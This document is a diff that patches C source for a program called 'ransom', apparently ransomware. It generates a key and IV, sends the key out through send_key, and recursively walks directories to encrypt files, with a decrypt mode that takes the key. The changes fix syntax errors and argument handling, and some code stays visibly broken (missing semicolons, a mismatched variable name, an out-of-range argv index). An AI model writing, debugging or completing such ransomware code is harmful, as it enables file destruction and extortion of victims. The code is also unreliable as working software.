@@ -28,7 +28,7 @@ int send_key(char *pKey, char *pIv);
 void usage(void){
     printf(
             "\nUsage:\n"
-            " ./ransom <path> [e|d] <key in hex if decrypt>"
+            " ./ransom [e|d] <path> <key in hex if decrypt>"
             );
     printf(
             "\nOptions:\n"
@@ -67,8 +67,7 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
             d = opendir(name);
             if(d)
             {
-                while ((dir = readdir(d)) != NULL)
-                {
+                while ((dir = readdir(d)) != NULL) {
                     char* dirname;
                     strcpy(nameRep,rep->d_name);
 
@@ -80,7 +79,7 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
                         strcpy(newPath,name);
                         strcat(newPath,"/");
                         strcat(newPath,dirname);
-                        listdir(newPath,iv,key,de_flag) // recursive
+                        listdir(newPath,iv,key,de_flag); // recursive
                     }
                     else {  //if not dir
                         char *filename;
@@ -187,10 +186,11 @@ int main (int argc, char * argv[])
                 printf("Do something more like ./ransom -e <path>\n");
                 return 0;
             }
-
-            generate_key(key, SIZEKEY, iv, SIZEIV, pKey, pIv);
-            send_key(pKey, pIV);
-            listdir(argv[2],iv,key,0);                                                                       // to verify
+            else {
+                generate_key(key, SIZEKEY, iv, SIZEIV, pKey, pIv);
+                send_key(pKey, pIV);
+                listdir(argv[2],iv,key,0);
+            }
         }
         else if (!strcmp(argv[1],"-d") {
             if (argc != 5) {
@@ -204,6 +204,7 @@ int main (int argc, char * argv[])
                 }
                 else {
                     printf("Wrong key size")
+                    return 0;
                 }
 
                 if (strlen(argv[5]) == SIZEIV*2){
@@ -211,6 +212,7 @@ int main (int argc, char * argv[])
                 }
                 else {
                     printf("Wrong iv size")
+                    return 0;
                 }
                 listdir(argv[2],iv,key,1);
             }
